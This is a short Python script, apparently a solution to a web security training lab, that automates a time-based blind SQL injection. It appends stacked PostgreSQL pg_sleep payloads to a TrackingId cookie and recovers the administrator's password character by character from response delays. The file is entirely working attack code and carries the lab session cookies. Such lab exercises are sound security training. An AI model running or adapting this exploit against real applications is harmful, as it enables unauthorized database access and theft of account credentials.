import requests
import time

url = "https://0a2400d70355daa981942ae50063006e.web-security-academy.net/filter?category=Gifts"
cookies = {
    "TrackingId": "jmXrzZJq1ms1QSkK",
    "session": "KSOEAdX8r0S1MwFb7YabJzQW8mOUWtMb"
}

def getTime(payload):
    cookies_payload = cookies.copy()
    cookies_payload["TrackingId"] += payload
    start_time = time.time()
    response = requests.get(url, cookies=cookies_payload)
    elapsed_time = time.time() - start_time
    return elapsed_time

def extractPassword():
    extracted_password = ""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"

    for pos in range(1, 21):
        for char in chars:
            payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
            time = getTime(payload)
            if time > 6:
                print(f"Found character '{char}' at position {pos}")
                extracted_password += char
                break
    return extracted_password

password = extractPassword()
print(password)